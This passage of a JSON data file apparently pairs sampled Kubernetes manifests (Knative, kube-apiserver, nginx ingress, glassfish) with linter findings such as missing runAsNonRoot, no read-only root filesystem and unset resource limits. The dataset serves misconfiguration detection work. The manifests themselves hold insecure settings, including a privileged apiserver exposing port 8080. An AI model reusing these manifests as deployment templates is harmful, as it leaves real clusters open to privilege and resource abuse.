METRICS_DOMAIN\n          value: knative.dev/inmemorychannel-controller\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: DISPATCHER_IMAGE\n          value: gcr.io/knative-releases/knative.dev/eventing/cmd/in_memory/channel_dispatcher@sha256:a6983f71c04619928199cc21e07ee6f1e1c87586621bc03b10c9ba1abd92bfa8\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/knative-releases/knative.dev/eventing/cmd/in_memory/channel_controller@sha256:904f42a768a9bc64999e7302d2bc7c1c48a08e74a82355cf57be513e6a124b82\n        name: controller\n        ports:\n        - containerPort: 9090\n          name: metrics\n        - containerPort: 8008\n          name: profiling\n        securityContext:\n          allowPrivilegeEscalation: false\n      serviceAccountName: imc-controller\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"controller\" has cpu request 0"
  },
  {
    "id": "03409",
    "manifest_path": "data/manifests/the_stack_sample/sample_1477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: knative-eventing\n    app.kubernetes.io/name: knative-eventing\n    eventing.knative.dev/release: v0.22.1\n    knative.dev/high-availability: 'true'\n    kustomize.component: knative\n  name: imc-controller\n  namespace: knative-eventing\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: knative-eventing\n      app.kubernetes.io/name: knative-eventing\n      kustomize.component: knative\n      messaging.knative.dev/channel: in-memory-channel\n      messaging.knative.dev/role: controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: knative-eventing\n        app.kubernetes.io/name: knative-eventing\n        kustomize.component: knative\n        messaging.knative.dev/channel: in-memory-channel\n        messaging.knative.dev/role: controller\n    spec:\n      containers:\n      - env:\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/inmemorychannel-controller\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: DISPATCHER_IMAGE\n          value: gcr.io/knative-releases/knative.dev/eventing/cmd/in_memory/channel_dispatcher@sha256:a6983f71c04619928199cc21e07ee6f1e1c87586621bc03b10c9ba1abd92bfa8\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/knative-releases/knative.dev/eventing/cmd/in_memory/channel_controller@sha256:904f42a768a9bc64999e7302d2bc7c1c48a08e74a82355cf57be513e6a124b82\n        name: controller\n        ports:\n        - containerPort: 9090\n          name: metrics\n        - containerPort: 8008\n          name: profiling\n        securityContext:\n          allowPrivilegeEscalation: false\n      serviceAccountName: imc-controller\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"controller\" has memory limit 0"
  },
  {
    "id": "03410",
    "manifest_path": "data/manifests/the_stack_sample/sample_1480.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: quay.io/coreos/hyperkube:v1.1.8_coreos.0\n    command:\n    - /hyperkube\n    - apiserver\n    - --bind-address=0.0.0.0\n    - --etcd-servers=${ETCD_ENDPOINTS}\n    - --allow-privileged=true\n    - --service-cluster-ip-range=${SERVICE_IP_RANGE}\n    - --secure-port=443\n    - --advertise-address=${ADVERTISE_IP}\n    - --admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota\n    - --tls-cert-file=/etc/kubernetes/ssl/apiserver.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    ports:\n    - containerPort: 443\n      hostPort: 443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/ssl\n      name: ssl-certs-kubernetes\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: ssl-certs-host\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: ssl-certs-kubernetes\n  - hostPath:\n      path: /usr/share/ca-certificates\n    name: ssl-certs-host\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-apiserver\" does not have a read-only root file system"
  },
  {
    "id": "03411",
    "manifest_path": "data/manifests/the_stack_sample/sample_1480.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: quay.io/coreos/hyperkube:v1.1.8_coreos.0\n    command:\n    - /hyperkube\n    - apiserver\n    - --bind-address=0.0.0.0\n    - --etcd-servers=${ETCD_ENDPOINTS}\n    - --allow-privileged=true\n    - --service-cluster-ip-range=${SERVICE_IP_RANGE}\n    - --secure-port=443\n    - --advertise-address=${ADVERTISE_IP}\n    - --admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota\n    - --tls-cert-file=/etc/kubernetes/ssl/apiserver.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    ports:\n    - containerPort: 443\n      hostPort: 443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/ssl\n      name: ssl-certs-kubernetes\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: ssl-certs-host\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: ssl-certs-kubernetes\n  - hostPath:\n      path: /usr/share/ca-certificates\n    name: ssl-certs-host\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-apiserver\" is not set to runAsNonRoot"
  },
  {
    "id": "03412",
    "manifest_path": "data/manifests/the_stack_sample/sample_1480.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: quay.io/coreos/hyperkube:v1.1.8_coreos.0\n    command:\n    - /hyperkube\n    - apiserver\n    - --bind-address=0.0.0.0\n    - --etcd-servers=${ETCD_ENDPOINTS}\n    - --allow-privileged=true\n    - --service-cluster-ip-range=${SERVICE_IP_RANGE}\n    - --secure-port=443\n    - --advertise-address=${ADVERTISE_IP}\n    - --admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota\n    - --tls-cert-file=/etc/kubernetes/ssl/apiserver.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    ports:\n    - containerPort: 443\n      hostPort: 443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/ssl\n      name: ssl-certs-kubernetes\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: ssl-certs-host\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: ssl-certs-kubernetes\n  - hostPath:\n      path: /usr/share/ca-certificates\n    name: ssl-certs-host\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-apiserver\" has cpu request 0"
  },
  {
    "id": "03413",
    "manifest_path": "data/manifests/the_stack_sample/sample_1480.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: quay.io/coreos/hyperkube:v1.1.8_coreos.0\n    command:\n    - /hyperkube\n    - apiserver\n    - --bind-address=0.0.0.0\n    - --etcd-servers=${ETCD_ENDPOINTS}\n    - --allow-privileged=true\n    - --service-cluster-ip-range=${SERVICE_IP_RANGE}\n    - --secure-port=443\n    - --advertise-address=${ADVERTISE_IP}\n    - --admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota\n    - --tls-cert-file=/etc/kubernetes/ssl/apiserver.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    ports:\n    - containerPort: 443\n      hostPort: 443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/ssl\n      name: ssl-certs-kubernetes\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: ssl-certs-host\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: ssl-certs-kubernetes\n  - hostPath:\n      path: /usr/share/ca-certificates\n    name: ssl-certs-host\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-apiserver\" has memory limit 0"
  },
  {
    "id": "03414",
    "manifest_path": "data/manifests/the_stack_sample/sample_1481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.5\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/nginx-errors\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress-lb\" does not have a read-only root file system"
  },
  {
    "id": "03415",
    "manifest_path": "data/manifests/the_stack_sample/sample_1481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.5\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/nginx-errors\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-ingress-lb\" is not set to runAsNonRoot"
  },
  {
    "id": "03416",
    "manifest_path": "data/manifests/the_stack_sample/sample_1481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.5\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/nginx-errors\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has cpu request 0"
  },
  {
    "id": "03417",
    "manifest_path": "data/manifests/the_stack_sample/sample_1481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.5\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/nginx-errors\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has memory limit 0"
  },
  {
    "id": "03418",
    "manifest_path": "data/manifests/the_stack_sample/sample_1489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: labelbot-diff\n  name: labelbot-diff\n  namespace: label-bot-prod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: labelbot-diff\n  template:\n    metadata:\n      labels:\n        app: labelbot-diff\n    spec:\n      containers:\n      - command:\n        - /automl\n        - serve\n        - --kptFile=/src/code-intelligence.git/Label_Microservice/deployment/Kptfile\n        - --port=8080\n        image: gcr.io/issue-label-bot-dev/labelbot-diff:348b22c@sha256:5c92366b6bee63930de364b7d674fc1713d0f87d45eed989d2ef41e32e34c33b\n        name: diff\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      - args:\n        - --repo=https://github.com/kubeflow/code-intelligence.git\n        - --branch=master\n        - --root=/src\n        - --wait=30\n        image: k8s.gcr.io/git-sync:v3.1.6\n        name: sync\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      serviceAccount: auto-update\n      volumes:\n      - emptyDir: {}\n        name: src\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"diff\" does not have a read-only root file system"
  },
  {
    "id": "03419",
    "manifest_path": "data/manifests/the_stack_sample/sample_1489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: labelbot-diff\n  name: labelbot-diff\n  namespace: label-bot-prod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: labelbot-diff\n  template:\n    metadata:\n      labels:\n        app: labelbot-diff\n    spec:\n      containers:\n      - command:\n        - /automl\n        - serve\n        - --kptFile=/src/code-intelligence.git/Label_Microservice/deployment/Kptfile\n        - --port=8080\n        image: gcr.io/issue-label-bot-dev/labelbot-diff:348b22c@sha256:5c92366b6bee63930de364b7d674fc1713d0f87d45eed989d2ef41e32e34c33b\n        name: diff\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      - args:\n        - --repo=https://github.com/kubeflow/code-intelligence.git\n        - --branch=master\n        - --root=/src\n        - --wait=30\n        image: k8s.gcr.io/git-sync:v3.1.6\n        name: sync\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      serviceAccount: auto-update\n      volumes:\n      - emptyDir: {}\n        name: src\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sync\" does not have a read-only root file system"
  },
  {
    "id": "03420",
    "manifest_path": "data/manifests/the_stack_sample/sample_1489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: labelbot-diff\n  name: labelbot-diff\n  namespace: label-bot-prod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: labelbot-diff\n  template:\n    metadata:\n      labels:\n        app: labelbot-diff\n    spec:\n      containers:\n      - command:\n        - /automl\n        - serve\n        - --kptFile=/src/code-intelligence.git/Label_Microservice/deployment/Kptfile\n        - --port=8080\n        image: gcr.io/issue-label-bot-dev/labelbot-diff:348b22c@sha256:5c92366b6bee63930de364b7d674fc1713d0f87d45eed989d2ef41e32e34c33b\n        name: diff\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      - args:\n        - --repo=https://github.com/kubeflow/code-intelligence.git\n        - --branch=master\n        - --root=/src\n        - --wait=30\n        image: k8s.gcr.io/git-sync:v3.1.6\n        name: sync\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      serviceAccount: auto-update\n      volumes:\n      - emptyDir: {}\n        name: src\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"diff\" is not set to runAsNonRoot"
  },
  {
    "id": "03421",
    "manifest_path": "data/manifests/the_stack_sample/sample_1489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: labelbot-diff\n  name: labelbot-diff\n  namespace: label-bot-prod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: labelbot-diff\n  template:\n    metadata:\n      labels:\n        app: labelbot-diff\n    spec:\n      containers:\n      - command:\n        - /automl\n        - serve\n        - --kptFile=/src/code-intelligence.git/Label_Microservice/deployment/Kptfile\n        - --port=8080\n        image: gcr.io/issue-label-bot-dev/labelbot-diff:348b22c@sha256:5c92366b6bee63930de364b7d674fc1713d0f87d45eed989d2ef41e32e34c33b\n        name: diff\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      - args:\n        - --repo=https://github.com/kubeflow/code-intelligence.git\n        - --branch=master\n        - --root=/src\n        - --wait=30\n        image: k8s.gcr.io/git-sync:v3.1.6\n        name: sync\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      serviceAccount: auto-update\n      volumes:\n      - emptyDir: {}\n        name: src\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sync\" is not set to runAsNonRoot"
  },
  {
    "id": "03422",
    "manifest_path": "data/manifests/the_stack_sample/sample_1489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: labelbot-diff\n  name: labelbot-diff\n  namespace: label-bot-prod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: labelbot-diff\n  template:\n    metadata:\n      labels:\n        app: labelbot-diff\n    spec:\n      containers:\n      - command:\n        - /automl\n        - serve\n        - --kptFile=/src/code-intelligence.git/Label_Microservice/deployment/Kptfile\n        - --port=8080\n        image: gcr.io/issue-label-bot-dev/labelbot-diff:348b22c@sha256:5c92366b6bee63930de364b7d674fc1713d0f87d45eed989d2ef41e32e34c33b\n        name: diff\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      - args:\n        - --repo=https://github.com/kubeflow/code-intelligence.git\n        - --branch=master\n        - --root=/src\n        - --wait=30\n        image: k8s.gcr.io/git-sync:v3.1.6\n        name: sync\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      serviceAccount: auto-update\n      volumes:\n      - emptyDir: {}\n        name: src\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"diff\" has cpu request 0"
  },
  {
    "id": "03423",
    "manifest_path": "data/manifests/the_stack_sample/sample_1489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: labelbot-diff\n  name: labelbot-diff\n  namespace: label-bot-prod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: labelbot-diff\n  template:\n    metadata:\n      labels:\n        app: labelbot-diff\n    spec:\n      containers:\n      - command:\n        - /automl\n        - serve\n        - --kptFile=/src/code-intelligence.git/Label_Microservice/deployment/Kptfile\n        - --port=8080\n        image: gcr.io/issue-label-bot-dev/labelbot-diff:348b22c@sha256:5c92366b6bee63930de364b7d674fc1713d0f87d45eed989d2ef41e32e34c33b\n        name: diff\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      - args:\n        - --repo=https://github.com/kubeflow/code-intelligence.git\n        - --branch=master\n        - --root=/src\n        - --wait=30\n        image: k8s.gcr.io/git-sync:v3.1.6\n        name: sync\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      serviceAccount: auto-update\n      volumes:\n      - emptyDir: {}\n        name: src\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sync\" has cpu request 0"
  },
  {
    "id": "03424",
    "manifest_path": "data/manifests/the_stack_sample/sample_1489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: labelbot-diff\n  name: labelbot-diff\n  namespace: label-bot-prod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: labelbot-diff\n  template:\n    metadata:\n      labels:\n        app: labelbot-diff\n    spec:\n      containers:\n      - command:\n        - /automl\n        - serve\n        - --kptFile=/src/code-intelligence.git/Label_Microservice/deployment/Kptfile\n        - --port=8080\n        image: gcr.io/issue-label-bot-dev/labelbot-diff:348b22c@sha256:5c92366b6bee63930de364b7d674fc1713d0f87d45eed989d2ef41e32e34c33b\n        name: diff\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      - args:\n        - --repo=https://github.com/kubeflow/code-intelligence.git\n        - --branch=master\n        - --root=/src\n        - --wait=30\n        image: k8s.gcr.io/git-sync:v3.1.6\n        name: sync\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      serviceAccount: auto-update\n      volumes:\n      - emptyDir: {}\n        name: src\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"diff\" has memory limit 0"
  },
  {
    "id": "03425",
    "manifest_path": "data/manifests/the_stack_sample/sample_1489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: labelbot-diff\n  name: labelbot-diff\n  namespace: label-bot-prod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: labelbot-diff\n  template:\n    metadata:\n      labels:\n        app: labelbot-diff\n    spec:\n      containers:\n      - command:\n        - /automl\n        - serve\n        - --kptFile=/src/code-intelligence.git/Label_Microservice/deployment/Kptfile\n        - --port=8080\n        image: gcr.io/issue-label-bot-dev/labelbot-diff:348b22c@sha256:5c92366b6bee63930de364b7d674fc1713d0f87d45eed989d2ef41e32e34c33b\n        name: diff\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      - args:\n        - --repo=https://github.com/kubeflow/code-intelligence.git\n        - --branch=master\n        - --root=/src\n        - --wait=30\n        image: k8s.gcr.io/git-sync:v3.1.6\n        name: sync\n        volumeMounts:\n        - mountPath: /src\n          name: src\n      serviceAccount: auto-update\n      volumes:\n      - emptyDir: {}\n        name: src\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sync\" has memory limit 0"
  },
  {
    "id": "03426",
    "manifest_path": "data/manifests/the_stack_sample/sample_1490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: glassfish\nspec:\n  selector:\n    matchLabels:\n      app: glassfish\n  template:\n    metadata:\n      labels:\n        app: glassfish\n    spec:\n      containers:\n      - name: container\n        image: fanjiankong-bj.tencentcloudcr.com/apparate/glassfish:4.1-jdk8\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 3\n          periodSeconds: 2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container\" does not have a read-only root file system"
  },
  {
    "id": "03427",
    "manifest_path": "data/manifests/the_stack_sample/sample_1490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: glassfish\nspec:\n  selector:\n    matchLabels:\n      app: glassfish\n  template:\n    metadata:\n      labels:\n        app: glassfish\n    spec:\n      containers:\n      - name: container\n        image: fanjiankong-bj.tencentcloudcr.com/apparate/glassfish:4.1-jdk8\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 3\n          periodSeconds: 2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container\" is not set to runAsNonRoot"
  },
  {
    "id": "03428",
    "manifest_path": "data/manifests/the_stack_sample/sample_1490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: glassfish\nspec:\n  selector:\n    matchLabels:\n      app: glassfish\n  template:\n    metadata:\n      labels:\n        app: glassfish\n    spec:\n      containers:\n      - name: container\n        image: fanjiankong-bj.tencentcloudcr.com/apparate/glassfish:4.1-jdk8\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 3\n          periodSeconds: 2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container\" has cpu request 0"
  },
  {
    "id": "03429",
    "manifest_path": "data/manifests/the_stack_sample/sample_1490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: glassfish\nspec:\n  selector:\n    matchLabels:\n      app: glassfish\n  template:\n    metadata:\n      labels:\n        app: glassfish\n    spec:\n      containers:\n      - name: container\n        image: fanjiankong-bj.tencentcloudcr.com/apparate/glassfish:4.1-jdk8\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 3\n          periodSeconds: 2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container\" has memory limit 0"
  },
  {
    "id": "03430",
    "manifest_path": "data/manifests/the_stack_sample/sample_1492.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9742\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03431",
    "manifest_path": "data/manifests/the_stack_sample/sample_1492.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9742\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03432",
    "manifest_path": "data/manifests/the_stack_sample/sample_1492.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9742\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03433",
    "manifest_path": "data/manifests/the_stack_sample/sample_1492.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9742\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03434",
    "manifest_path": "data/manifests/the_stack_sample/sample_1492.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9742\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03435",
    "manifest_path": "data/manifests/the_stack_sample/sample_1493.yaml",
